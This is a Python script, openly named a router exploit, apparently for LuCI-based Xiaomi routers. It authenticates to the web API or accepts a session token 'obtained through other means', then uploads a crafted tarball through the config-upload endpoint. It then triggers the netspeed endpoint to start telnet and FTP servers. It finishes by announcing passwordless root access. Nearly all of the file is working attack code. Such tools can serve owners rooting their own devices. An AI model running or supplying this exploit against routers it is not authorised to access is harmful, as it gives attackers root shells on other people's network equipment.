import sys
import re
import time
import random
import hashlib
import requests
import socket
import argparse

import gateway
import logger

# Initialize logging
log = logger.RouterLogger("main.py")
log.info("Starting router exploit process")

# Parse command line arguments
parser = argparse.ArgumentParser(description='Router Exploit Script')
parser.add_argument('--token', '-t', help='Use provided session token instead of authentication')
parser.add_argument('--skip-auth', '-s', action='store_true', help='Skip authentication and prompt for manual token')
args = parser.parse_args()

router_ip_address=gateway.get_ip_address()
log.info(f"Router IP address detected: {router_ip_address}")

# Function to validate token format
def validate_token(token):
	"""Validate if the token has a reasonable format"""
	if not token or len(token) < 10:
		return False
	# Basic validation - token should be alphanumeric and reasonable length
	return all(c.isalnum() for c in token) and len(token) <= 100

# Function to get manual token input
def get_manual_token():
	"""Get manual token input from user with instructions"""
	print("\n" + "="*60)
	print("FALLBACK OPTION: Manual Token Input")
	print("="*60)
	print("If you have obtained a valid session token through other means")
	print("(e.g., browser developer tools, previous successful login, etc.),")
	print("you can enter it manually to continue.")
	print("\nTo get a token manually:")
	print("1. Open router web interface in browser")
	print(f"2. Navigate to http://{router_ip_address}")
	print("3. Login with correct credentials")
	print("4. Open browser developer tools (F12)")
	print("5. Go to Network tab and refresh the page")
	print("6. Look for requests to /api/xqsystem/login")
	print("7. Copy the 'token' value from the response")
	print("="*60)
	
	manual_token = input("\nEnter session token manually (or press Enter to exit): ").strip()
	
	if not manual_token:
		log.info("User chose to exit - no manual token provided")
		print("Exiting...")
		sys.exit(1)
	
	# Validate the token format
	if not validate_token(manual_token):
		log.error(f"Invalid token format provided: {manual_token}")
		print("Invalid token format. Token should be alphanumeric and at least 10 characters.")
		sys.exit(1)
	
	return manual_token

# Handle different authentication scenarios
if args.token:
	# Token provided via command line
	if not validate_token(args.token):
		log.error(f"Invalid token format provided via command line: {args.token}")
		print("Invalid token format. Token should be alphanumeric and at least 10 characters.")
		sys.exit(1)
	stok = args.token
	log.info(f"Using command line provided token: {stok[:10]}...")
	print(f"Using provided token: {stok}")
	print("Skipping authentication...")
	
elif args.skip_auth:
	# Skip authentication and go directly to manual token input
	log.info("Skipping authentication as requested")
	print("Skipping authentication - manual token input required")
	stok = get_manual_token()
	log.info(f"Using manually provided token: {stok[:10]}...")
	
else:
	# Normal authentication flow
	stok = None
	try: 
		log.info("Attempting to connect to router web interface")
		r0 = requests.get(f"http://{router_ip_address}/cgi-bin/luci/web")
		log.log_http_request("GET", f"http://{router_ip_address}/cgi-bin/luci/web", r0.status_code)
	except Exception as e:
		log.error(f"Router not found: {e}")
		print("Router not found.")
		sys.exit(1)
		
	try:	
		mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
		log.info(f"Device MAC found: {mac}")
	except Exception as e:
		log.error(f"Incorrect router model - could not extract device ID: {e}")
		print("Incorrect router model.")
		sys.exit(1)
		
	key = re.findall(r'key: \'(.*)\',', r0.text)[0]
	log.debug(f"Authentication key extracted")
	nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
	log.debug(f"Generated nonce: {nonce}")
	
	# Get password from user
	user_password = input("Enter password: ")
	account_str = hashlib.sha1((user_password + key).encode('utf-8')).hexdigest()
	password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
	log.info("Password hash generated successfully")
	
	data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
	log.info("Attempting to authenticate with router")
	r1 = requests.post("http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address), 
		data = data, 
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
			"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
	log.log_http_request("POST", f"http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login", r1.status_code)

	try:	
		stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
		log.info("Authentication successful, token obtained")
		print(f"\n✓ Authentication successful!")
		print(f"✓ Session token: {stok}")
		print(f"✓ You can save this token for future use with --token option")
		print("-" * 60)
	except (IndexError, Exception) as e:
		log.error(f"Authentication failed - response: {r1.text[:200]}...")
		if "list index out of range" in str(e) or isinstance(e, IndexError):
			log.error("No authentication token found in response - likely incorrect password")
			print("❌ Incorrect password or authentication failed.")
		else:
			log.error(f"Authentication error: {e}")
			print("❌ Authentication failed.")
		
		# Offer manual token input as fallback
		stok = get_manual_token()
		log.info(f"Using manually provided token: {stok[:10]}...")
		print("Using manual token - continuing with exploit...")

# Ensure we have a valid token before proceeding
if not stok:
	log.error("No valid token available - cannot proceed")
	print("❌ No valid session token available. Cannot proceed with exploit.")
	sys.exit(1)

print("Loading configuration files...")
log.info("Uploading exploit configuration files")

# Step 1: Upload configuration files
try:
	with open("data/main.tar.gz", 'rb') as config_file:
		upload_response = requests.post(
			f"http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload", 
			files={"image": config_file},
			timeout=30
		)
	log.log_http_request("POST", f"http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload", upload_response.status_code)
	
	if upload_response.status_code == 200:
		log.info("✓ Configuration files uploaded successfully")
		print("✓ Configuration files uploaded successfully")
	else:
		log.warning(f"Configuration upload returned status {upload_response.status_code}")
		print(f"⚠ Configuration upload warning: HTTP {upload_response.status_code}")
		
except FileNotFoundError:
	log.error("Configuration file data/main.tar.gz not found")
	print("❌ Error: Configuration file data/main.tar.gz not found")
	print("Please ensure the data directory contains main.tar.gz")
	sys.exit(1)
except Exception as e:
	log.error(f"Failed to upload configuration files: {e}")
	print(f"❌ Failed to upload configuration files: {e}")
	sys.exit(1)

print("Starting telnet and ftpd servers...")
log.info("Starting telnet and ftpd servers on router")

# Step 2: Trigger server startup (this might fail on some firmware versions)
try:
	netspeed_response = requests.get(
		f"http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed",
		timeout=10
	)
	log.log_http_request("GET", f"http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed", netspeed_response.status_code)
	
	if netspeed_response.status_code == 200:
		log.info("✓ Telnet/FTP servers activated successfully")
		print("✓ Telnet/FTP servers should now be running")
	elif netspeed_response.status_code == 404:
		log.warning("Netspeed API endpoint not found - this is normal on some firmware versions")
		print("⚠ Note: Some firmware versions don't support the netspeed trigger")
		print("✓ Configuration files uploaded - services should still be available")
	else:
		log.warning(f"Unexpected response from netspeed API: {netspeed_response.status_code}")
		print(f"⚠ Unexpected response: HTTP {netspeed_response.status_code}")
		print("✓ Configuration uploaded - trying to continue anyway")
		
except requests.exceptions.Timeout:
	log.warning("Netspeed API request timed out")
	print("⚠ Server activation request timed out - this may be normal")
	print("✓ Configuration uploaded - services should be available")
except requests.exceptions.ConnectionError:
	log.warning("Connection error during server activation")
	print("⚠ Connection error during activation - this may be normal")
	print("✓ Configuration uploaded - services should be available")
except Exception as e:
	log.warning(f"Server activation failed: {e}")
	print(f"⚠ Server activation warning: {e}")
	print("✓ Configuration uploaded - services may still be available")

# Always consider the exploit successful if we got this far
log.info("Router exploit process completed")
print("\n" + "="*60)
print("🎉 EXPLOIT COMPLETED!")
print("="*60)
print("✅ Configuration files have been uploaded to the router")
print("✅ Telnet and FTP services should now be available")
print("\n📡 Connection Options:")
print(f"   • FTP:    ftp {router_ip_address}")
print(f"   • Telnet: telnet {router_ip_address}")
print(f"   • Shell:  Use launcher option 6")
print("\n🔐 Default Credentials:")
print("   • Username: root")
print("   • Password: (no password)")
print("\n⚠️  Important Notes:")
print("   • If connection fails, wait 1-2 minutes and try again")
print("   • Some routers may require a reboot to activate services")
print("   • Services will be available until next router reboot")
print("="*60)